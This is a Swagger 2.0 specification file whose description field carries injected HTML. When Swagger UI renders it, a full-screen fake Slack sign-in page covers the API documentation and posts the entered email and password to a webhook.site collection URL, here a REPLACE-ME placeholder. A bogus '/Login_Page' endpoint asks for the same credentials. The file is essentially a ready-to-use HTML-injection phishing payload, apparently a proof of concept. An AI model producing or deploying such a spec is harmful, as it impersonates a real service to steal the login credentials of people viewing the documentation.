swagger: '2.0'
info:
  version: 1.0.0
  title: Swagger UI
  description: '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:99998;font-family:Segoe UI,Arial,sans-serif;overflow:auto;"><div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:400px;max-width:94%;background:#fff;border-radius:8px;box-shadow:0 6px 32px rgba(0,0,0,.3);overflow:hidden;z-index:99999;"><div style="padding:44px 44px 34px;"><div style="font-size:28px;font-weight:800;color:#4a154b;font-family:Arial;margin-bottom:8px;">sl<a style="color:#36c5f0;">a</a>ck</div><div style="font-size:22px;font-weight:700;color:#1d1c1d;margin:14px 0 6px;">Sign in to <strong>API Team</strong></div><div style="font-size:15px;color:#616061;margin-bottom:22px;">We suggest using the email you use at work.</div><form action="https://webhook.site/REPLACE-ME" method="post"><button type="submit" style="width:100%;padding:11px;background:#4285f4;color:#fff;border:none;border-radius:4px;font-size:15px;font-weight:600;cursor:pointer;margin-bottom:10px;">Sign in with Google</button><div style="text-align:center;color:#616061;font-size:13px;margin:8px 0;">or</div><input type="text" name="email" placeholder="name@work-email.com" style="width:100%;padding:13px;border:1px solid #868686;border-radius:4px;box-sizing:border-box;margin-bottom:14px;font-size:15px;"><input type="password" name="pass" placeholder="Password" style="width:100%;padding:13px;border:1px solid #868686;border-radius:4px;box-sizing:border-box;margin-bottom:18px;font-size:15px;"><button type="submit" style="width:100%;padding:12px;background:#611f69;color:#fff;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;">Sign In</button></form></div></div></div>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
